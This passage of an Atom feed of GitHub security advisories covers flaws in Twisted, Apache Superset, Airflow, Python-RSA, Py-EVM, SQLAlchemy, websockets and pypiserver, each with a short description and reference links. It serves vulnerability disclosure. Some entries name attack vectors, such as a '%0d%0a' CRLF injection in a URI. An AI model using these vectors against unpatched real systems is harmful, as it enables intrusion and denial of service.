<li><a href="https://github.com/twisted/twisted/commit/4a7d22e490bb8ff836892cc99a1f54b85ccb0281">https://github.com/twisted/twisted/commit/4a7d22e490bb8ff836892cc99a1f54b85ccb0281</a></li>
<li><a href="https://github.com/advisories/GHSA-h96w-mmrf-2h6v">https://github.com/advisories/GHSA-h96w-mmrf-2h6v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h96w-mmrf-2h6v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2020-03-31T15:42:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Twisted] HTTP Request Smuggling in Twisted]]></title>
        <id>https://github.com/advisories/GHSA-p5xh-vx83-mxcj</id>
        <link href="https://github.com/advisories/GHSA-p5xh-vx83-mxcj"/>
        <updated>2023-09-01T10:16:29.000Z</updated>
        <content type="html"><![CDATA[<p>In Twisted Web through 20.3.0, there was an HTTP request splitting vulnerability. When presented with a content-length and a chunked encoding header, the content-length took precedence and the remainder of the request body was interpreted as a pipelined request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10109">https://nvd.nist.gov/vuln/detail/CVE-2020-10109</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6ISMZFZBWW4EV6ETJGXAYIXN3AT7GBPL/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6ISMZFZBWW4EV6ETJGXAYIXN3AT7GBPL/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YW3NIL7VXSGJND2Q4BSXM3CFTAFU6T7D/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YW3NIL7VXSGJND2Q4BSXM3CFTAFU6T7D/</a></li>
<li><a href="https://usn.ubuntu.com/4308-1/">https://usn.ubuntu.com/4308-1/</a></li>
<li><a href="https://security.gentoo.org/glsa/202007-24">https://security.gentoo.org/glsa/202007-24</a></li>
<li><a href="https://usn.ubuntu.com/4308-2/">https://usn.ubuntu.com/4308-2/</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2022/02/msg00021.html">https://lists.debian.org/debian-lts-announce/2022/02/msg00021.html</a></li>
<li><a href="https://github.com/twisted/twisted/commit/4a7d22e490bb8ff836892cc99a1f54b85ccb0281">https://github.com/twisted/twisted/commit/4a7d22e490bb8ff836892cc99a1f54b85ccb0281</a></li>
<li><a href="https://github.com/twisted/twisted/blob/6ff2c40e42416c83203422ff70dfc49d2681c8e2/NEWS.rst#twisted-2030-2020-03-13">https://github.com/twisted/twisted/blob/6ff2c40e42416c83203422ff70dfc49d2681c8e2/NEWS.rst#twisted-2030-2020-03-13</a></li>
<li><a href="https://know.bishopfox.com/advisories/twisted-version-19.10.0">https://know.bishopfox.com/advisories/twisted-version-19.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p5xh-vx83-mxcj">https://github.com/advisories/GHSA-p5xh-vx83-mxcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p5xh-vx83-mxcj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2020-03-31T15:40:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[twisted] Forced Browsing in Twisted]]></title>
        <id>https://github.com/advisories/GHSA-3gqj-cmxr-p4x2</id>
        <link href="https://github.com/advisories/GHSA-3gqj-cmxr-p4x2"/>
        <updated>2023-09-01T10:15:03.000Z</updated>
        <content type="html"><![CDATA[<p>Twisted before 16.3.1 does not attempt to address RFC 3875 section 4.1.18 namespace conflicts and therefore does not protect CGI applications from the presence of untrusted client data in the <code>HTTP_PROXY</code> environment variable, which might allow remote attackers to redirect a CGI application's outbound HTTP traffic to an arbitrary proxy server via a crafted Proxy header in an HTTP request, aka an <code>httpoxy</code> issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-1000111">https://nvd.nist.gov/vuln/detail/CVE-2016-1000111</a></li>
<li><a href="https://twistedmatrix.com/pipermail/twisted-web/2016-August/005268.html">https://twistedmatrix.com/pipermail/twisted-web/2016-August/005268.html</a></li>
<li><a href="https://twistedmatrix.com/trac/ticket/8623">https://twistedmatrix.com/trac/ticket/8623</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2016/07/18/6">https://www.openwall.com/lists/oss-security/2016/07/18/6</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/linuxbulletinoct2016-3090545.html">http://www.oracle.com/technetwork/topics/security/linuxbulletinoct2016-3090545.html</a></li>
<li><a href="https://github.com/advisories/GHSA-3gqj-cmxr-p4x2">https://github.com/advisories/GHSA-3gqj-cmxr-p4x2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3gqj-cmxr-p4x2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-30T17:32:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-superset] Information disclosure in Apache Superset]]></title>
        <id>https://github.com/advisories/GHSA-fxjm-wvj9-9c39</id>
        <link href="https://github.com/advisories/GHSA-fxjm-wvj9-9c39"/>
        <updated>2023-09-01T10:12:41.000Z</updated>
        <content type="html"><![CDATA[<p>An information disclosure issue was found in Apache Superset 0.34.0, 0.34.1, 0.35.0, and 0.35.1. Authenticated Apache Superset users are able to retrieve other users' information, including hashed passwords, by accessing an unused and undocumented API endpoint on Apache Superset.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1932">https://nvd.nist.gov/vuln/detail/CVE-2020-1932</a></li>
<li><a href="https://lists.apache.org/thread.html/r4e5323c3bc786005495311a6ff53ac6d990b2c7eb52941a1a13ce227%40%3Cdev.superset.apache.org%3E">https://lists.apache.org/thread.html/r4e5323c3bc786005495311a6ff53ac6d990b2c7eb52941a1a13ce227%40%3Cdev.superset.apache.org%3E</a></li>
<li><a href="https://github.com/advisories/GHSA-fxjm-wvj9-9c39">https://github.com/advisories/GHSA-fxjm-wvj9-9c39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fxjm-wvj9-9c39</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2020-02-26T19:54:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Remote code execution in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-rvmq-4x66-q7j3</id>
        <link href="https://github.com/advisories/GHSA-rvmq-4x66-q7j3"/>
        <updated>2023-09-01T10:09:33.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11978">https://nvd.nist.gov/vuln/detail/CVE-2020-11978</a></li>
<li><a href="https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="http://packetstormsecurity.com/files/162908/Apache-Airflow-1.10.10-Remote-Code-Execution.html">http://packetstormsecurity.com/files/162908/Apache-Airflow-1.10.10-Remote-Code-Execution.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rvmq-4x66-q7j3">https://github.com/advisories/GHSA-rvmq-4x66-q7j3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rvmq-4x66-q7j3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-07-27T16:57:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rsa] Python-RSA decryption of ciphertext leads to DoS]]></title>
        <id>https://github.com/advisories/GHSA-537h-rv9q-vvph</id>
        <link href="https://github.com/advisories/GHSA-537h-rv9q-vvph"/>
        <updated>2023-09-01T10:08:36.000Z</updated>
        <content type="html"><![CDATA[<p>Python-RSA before 4.1 ignores leading '\0' bytes during decryption of ciphertext. This could conceivably have a security-relevant impact, e.g., by helping an attacker to infer that an application uses Python-RSA, or if the length of accepted ciphertext affects application behavior (such as by causing excessive memory allocation).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-13757">https://nvd.nist.gov/vuln/detail/CVE-2020-13757</a></li>
<li><a href="https://github.com/sybrenstuvel/python-rsa/issues/146">https://github.com/sybrenstuvel/python-rsa/issues/146</a></li>
<li><a href="https://github.com/sybrenstuvel/python-rsa/issues/146#issuecomment-641845667">https://github.com/sybrenstuvel/python-rsa/issues/146#issuecomment-641845667</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2KILTHBHNSDUCYV22ODLOKTICJJ7JQIQ/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2KILTHBHNSDUCYV22ODLOKTICJJ7JQIQ/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZYB65VNILRBTXL6EITQTH2PZPK7I23MW/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZYB65VNILRBTXL6EITQTH2PZPK7I23MW/</a></li>
<li><a href="https://usn.ubuntu.com/4478-1/">https://usn.ubuntu.com/4478-1/</a></li>
<li><a href="https://github.com/advisories/GHSA-537h-rv9q-vvph">https://github.com/advisories/GHSA-537h-rv9q-vvph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-537h-rv9q-vvph</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-03-24T18:24:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[py-evm] Py-EVM is vulnerable to arbitrary bytecode injection]]></title>
        <id>https://github.com/advisories/GHSA-vqgp-4jgj-5j64</id>
        <link href="https://github.com/advisories/GHSA-vqgp-4jgj-5j64"/>
        <updated>2023-09-01T10:05:12.000Z</updated>
        <content type="html"><![CDATA[<p>Py-EVM v0.2.0-alpha.33 allows attackers to make a vm.execute_bytecode call that triggers computation._stack.values with '"stack": [100, 100, 0]' where b'\x' was expected, resulting in an execution failure because of an invalid opcode. This is reportedly related to "smart contracts can be executed indefinitely without gas being paid."</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18920">https://nvd.nist.gov/vuln/detail/CVE-2018-18920</a></li>
<li><a href="https://github.com/ethereum/py-evm/issues/1448">https://github.com/ethereum/py-evm/issues/1448</a></li>
<li><a href="https://github.com/advisories/GHSA-vqgp-4jgj-5j64">https://github.com/advisories/GHSA-vqgp-4jgj-5j64</a></li>
<li><a href="https://twitter.com/AlexanderFisher/status/1060923428641878019">https://twitter.com/AlexanderFisher/status/1060923428641878019</a></li>
<li><a href="https://twitter.com/NettaLab/status/1060889400102383617">https://twitter.com/NettaLab/status/1060889400102383617</a></li>
<li><a href="https://www.reddit.com/r/ethereum/comments/9vkk2g/netta_labs_claim_to_have_found_a_vulnerability_in/e9d3wyx/">https://www.reddit.com/r/ethereum/comments/9vkk2g/netta_labs_claim_to_have_found_a_vulnerability_in/e9d3wyx/</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqgp-4jgj-5j64</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-11-21T22:23:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[SQLAlchemy] SQLAlchemy is vulnerable to SQL Injection via group_by parameter ]]></title>
        <id>https://github.com/advisories/GHSA-38fc-9xqv-7f7q</id>
        <link href="https://github.com/advisories/GHSA-38fc-9xqv-7f7q"/>
        <updated>2023-09-01T09:56:01.000Z</updated>
        <content type="html"><![CDATA[<p>SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-7548">https://nvd.nist.gov/vuln/detail/CVE-2019-7548</a></li>
<li><a href="https://github.com/sqlalchemy/sqlalchemy/issues/4481#issuecomment-461204518">https://github.com/sqlalchemy/sqlalchemy/issues/4481#issuecomment-461204518</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2019:0981">https://access.redhat.com/errata/RHSA-2019:0981</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2019:0984">https://access.redhat.com/errata/RHSA-2019:0984</a></li>
<li><a href="https://github.com/advisories/GHSA-38fc-9xqv-7f7q">https://github.com/advisories/GHSA-38fc-9xqv-7f7q</a></li>
<li><a href="https://github.com/no-security/sqlalchemy_test">https://github.com/no-security/sqlalchemy_test</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2019/03/msg00020.html">https://lists.debian.org/debian-lts-announce/2019/03/msg00020.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00087.html">http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00087.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00010.html">http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00010.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00016.html">http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00016.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2021/11/msg00005.html">https://lists.debian.org/debian-lts-announce/2021/11/msg00005.html</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38fc-9xqv-7f7q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2019-04-16T15:50:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[websockets] websockets is vulnerable to denial of service by memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-6g87-ff9q-v847</id>
        <link href="https://github.com/advisories/GHSA-6g87-ff9q-v847"/>
        <updated>2023-09-01T09:53:43.000Z</updated>
        <content type="html"><![CDATA[<p>The Python websockets library version 4 contains a CWE-409: Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in Servers and clients, unless configured with compression=None that can result in Denial of Service by memory exhaustion. This attack appears to be exploitable via sending a specially crafted frame on an established connection. This vulnerability appears to have been fixed in version 5.0</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000518">https://nvd.nist.gov/vuln/detail/CVE-2018-1000518</a></li>
<li><a href="https://github.com/aaugustin/websockets/pull/407">https://github.com/aaugustin/websockets/pull/407</a></li>
<li><a href="https://github.com/advisories/GHSA-6g87-ff9q-v847">https://github.com/advisories/GHSA-6g87-ff9q-v847</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6g87-ff9q-v847</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-09-17T20:46:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypiserver] CRLF Injection in pypiserver]]></title>
        <id>https://github.com/advisories/GHSA-mh24-7wvg-v88g</id>
        <link href="https://github.com/advisories/GHSA-mh24-7wvg-v88g"/>
        <updated>2023-09-01T09:46:46.000Z</updated>
        <content type="html"><![CDATA[<p>CRLF Injection in pypiserver 1.2.5 and below allows attackers to set arbitrary HTTP headers and possibly conduct XSS attacks via a <code>%0d%0a</code> in a URI.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6802">https://nvd.nist.gov/vuln/detail/CVE-2019-6802</a></li>
<li><a href="https://github.com/pypiserver/pypiserver/issues/237">https://github.com/pypiserver/pypiserver/issues/237</a></li>
<li><a href="https://github.com/advisories/GHSA-mh24-7wvg-v88g">https://github.com/advisories/GHSA-mh24-7wvg-v88g</a></li>
<li><a href="https://github.com/pypiserver/pypiserver/commit/1375a67c55a9b8d4619df30d2a1c0b239d7357e6">https://github.com/pypiserver/pypiserver/commit/1375a67c55a9b8d4619df30d2a1c0b239d7357e6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh24-7wvg-v88g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2019-01-30T20:56:26.000Z</published>
    </entry>
</feed>